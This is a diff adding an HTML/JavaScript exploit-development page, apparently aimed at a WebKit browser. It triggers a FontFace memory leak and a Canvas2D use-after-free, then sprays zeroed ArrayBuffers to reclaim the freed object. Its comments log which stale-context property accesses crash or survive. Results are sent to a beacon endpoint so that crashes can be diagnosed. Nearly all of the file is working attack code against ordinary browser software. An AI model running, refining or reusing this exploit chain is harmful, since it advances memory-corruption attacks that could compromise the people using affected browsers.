@@ -1,0 +1,189 @@
+<!--
+  p687: Canvas2D AB(768) reclaim — find safe property access paths
+  (renumbered from p682; upstream master ships p682_fontface_canvas_arbread.html
+  in phase23_info_leak, so the short name collided)
+  
+  CONFIRMED: AB(768) reclaims Canvas2D (IsoHeap OFF). But lineWidth crashes
+  because vtable at +0x00 is NULL → any virtual call = SIGSEGV.
+  
+  kabangast p568 v8 found: webkitBackingStorePixelRatio SURVIVES on zeroed AB
+  (returns constant 1). It may be a non-virtual or constant-return path.
+  
+  Strategy: beacon BEFORE each property access. If process dies, the last
+  beacon tells us which property crashed. Try properties one per page load
+  to avoid cascade crashes.
+  
+  Phase A: FontFace leak (same as p680)
+  Phase B: Canvas2D UAF → AB(768) zeroed
+  Phase C: Try ONE safe property per load, controlled by URL hash:
+    #0 = webkitBackingStorePixelRatio (expected: survives)
+    #1 = canvas (the .canvas property — returns the canvas element ref)
+    #2 = lineWidth
+    #3 = globalAlpha
+    #4 = getTransform()
+    #5 = fillStyle
+    #6 = font
+    #7 = getImageData(0,0,1,1)
+    #8 = isPointInPath(0,0)
+    #9 = measureText('x')
+  
+  Default (#0) tests the safe property first.
+  
+  CRASH_CLASS: HIGH per property test
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p687</title></head>
+<body>p687: safe access test
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function(){
+'use strict';
+var L=document.getElementById('log'),bQ=[];
+function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);if(bQ.length>=1)flush();}
+function flush(){if(!bQ.length)return;try{var b=bQ.splice(0,3).join('|');var x=new XMLHttpRequest();x.open('GET','/beacon/P687-'+encodeURIComponent(b),false);x.send();}catch(e){}}
+window.onerror=function(m){emit('ERR',String(m).slice(0,200));flush();};
+var f64=new Float64Array(1),u8f=new Uint8Array(f64.buffer);
+function d2hex(d){f64[0]=d;var h='';for(var i=7;i>=0;i--)h+=('0'+u8f[i].toString(16)).slice(-2);return h;}
+
+// Which test to run (from URL hash)
+var testIdx=parseInt(location.hash.slice(1));if(isNaN(testIdx))testIdx=1;
+emit('START','v1 test='+testIdx);flush();
+var alive=[];
+
+// ================================================================
+// PHASE A: FontFace leak (quick, same as p680)
+// ================================================================
+var leaked={raw58:'',raw68:''};
+try{
+  var style=document.createElement('style');
+  style.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042}";
+  document.head.appendChild(style);
+  var ff=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(ff);void ff.loaded;alive.push(ff);
+  var firedA=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(firedA)return undefined;firedA=true;
+      style.remove();try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      window.__fm=[];
+      for(var k=0;k<16;k++) window.__fm.push({ab:new ArrayBuffer(192),view:new Uint8Array(new ArrayBuffer(192))});
+      // Recreate views properly
+      window.__fm=[];
+      for(var k=0;k<16;k++){
+        var ab=new ArrayBuffer(192);
+        window.__fm.push({ab:ab,view:new Uint8Array(ab)});
+      }
+      try{document.fonts.check('1em s0');}catch(e){}
+      return undefined;
+    },set:function(){}
+  });
+  document.fonts.load('1em f0, s0','AB');
+}catch(e){emit('A-ERR',e.message);}
+
+setTimeout(function(){
+  var map=window.__fm||[],bestI=-1,bestN=0;
+  for(var i=0;i<map.length;i++){
+    var v=map[i].view,n=0;
+    for(var j=0;j<v.length;j++)if(v[j]!==0)n++;
+    if(n>bestN){bestN=n;bestI=i;}
+  }
+  if(bestI>=0){
+    var v=map[bestI].view;
+    var hex58='';for(var i=7;i>=0;i--)hex58+=('0'+v[0x58+i].toString(16)).slice(-2);
+    var hex68='';for(var i=7;i>=0;i--)hex68+=('0'+v[0x68+i].toString(16)).slice(-2);
+    leaked.raw58=hex58;leaked.raw68=hex68;
+    emit('A-LEAK','T=0x'+hex58+' impl=0x'+hex68);
+  } else {
+    emit('A-CLEAN','no reclaim');
+  }
+  flush();
+  doCanvasTest();
+},150);
+
+function doCanvasTest(){
+  // Canvas2D UAF trigger
+  emit('B','canvas-uaf');
+  var staleCtx=null;
+  try{
+    var oc=document.createElement('canvas');oc.width=4;oc.height=4;
+    document.body.appendChild(oc);
+    var triggered=false,innerCtx=null;
+    var opts={};
+    Object.defineProperty(opts,'alpha',{get:function(){
+      if(!triggered){triggered=true;innerCtx=oc.getContext('2d');}
+      return true;
+    }});
+    oc.getContext('bitmaprenderer',opts);
+    staleCtx=innerCtx;
+    emit('B-UAF','ok');
+  }catch(e){emit('B-ERR',e.message);flush();return;}
+
+  // AB(768) spray — zeroed
+  for(var i=0;i<50;i++){
+    var ab=new ArrayBuffer(768);
+    alive.push(ab);
+  }
+  emit('B-SPRAY','50 zeroed');flush();
+
+  // ================================================================
+  // PHASE C: Try ONE property, beacon before AND after
+  // ================================================================
+  var tests=[
+    {name:'webkitBackingStorePixelRatio',fn:function(ctx){return ctx.webkitBackingStorePixelRatio;}},
+    {name:'canvas',fn:function(ctx){return ctx.canvas;}},
+    {name:'lineWidth',fn:function(ctx){return ctx.lineWidth;}},
+    {name:'globalAlpha',fn:function(ctx){return ctx.globalAlpha;}},
+    {name:'getTransform',fn:function(ctx){return ctx.getTransform();}},
+    {name:'fillStyle',fn:function(ctx){return ctx.fillStyle;}},
+    {name:'font',fn:function(ctx){return ctx.font;}},
+    {name:'getImageData',fn:function(ctx){return ctx.getImageData(0,0,1,1);}},
+    {name:'isPointInPath',fn:function(ctx){return ctx.isPointInPath(0,0);}},
+    {name:'measureText',fn:function(ctx){return ctx.measureText('x');}},
+  ];
+
+  if(testIdx>=tests.length){emit('C-SKIP','testIdx='+testIdx+' out of range');flush();return;}
+
+  var test=tests[testIdx];
+  emit('C-TRYING',test.name+' (test='+testIdx+')');
+  flush(); // MUST flush before — if crash happens, this is the last beacon
+
+  try{
+    var result=test.fn(staleCtx);
+    // If we get here, it SURVIVED!
+    emit('C-SURVIVED','*** '+test.name+' SURVIVED! ***');
+    if(typeof result==='number'){
+      emit('C-VALUE','number='+result+' hex='+d2hex(result));
+    } else if(typeof result==='string'){
+      emit('C-VALUE','string='+result.slice(0,60));
+    } else if(typeof result==='boolean'){
+      emit('C-VALUE','boolean='+result);
+    } else if(result===null){
+      emit('C-VALUE','null');
+    } else if(typeof result==='object'){
+      emit('C-VALUE','object type='+Object.prototype.toString.call(result));
+      // Try to extract data from DOMMatrix (getTransform result)
+      if(result.a!==undefined){
+        emit('C-MATRIX','a='+d2hex(result.a)+' b='+d2hex(result.b)+' c='+d2hex(result.c));
+        emit('C-MATRIX2','d='+d2hex(result.d)+' e='+d2hex(result.e)+' f='+d2hex(result.f));
+      }
+      // Try ImageData
+      if(result.data){
+        var px=result.data;
+        var s='';for(var i=0;i<Math.min(16,px.length);i++)s+=('0'+px[i].toString(16)).slice(-2);
+        emit('C-PIXELS',s);
+      }
+    } else {
+      emit('C-VALUE','typeof='+typeof result);
+    }
+  }catch(e){
+    emit('C-THREW',test.name+' threw '+e.name+': '+e.message);
+  }
+  flush();
+
+  emit('DONE','p687 test='+testIdx+' complete');flush();
+}
+
+})();
+</script>
+</body>
+</html>
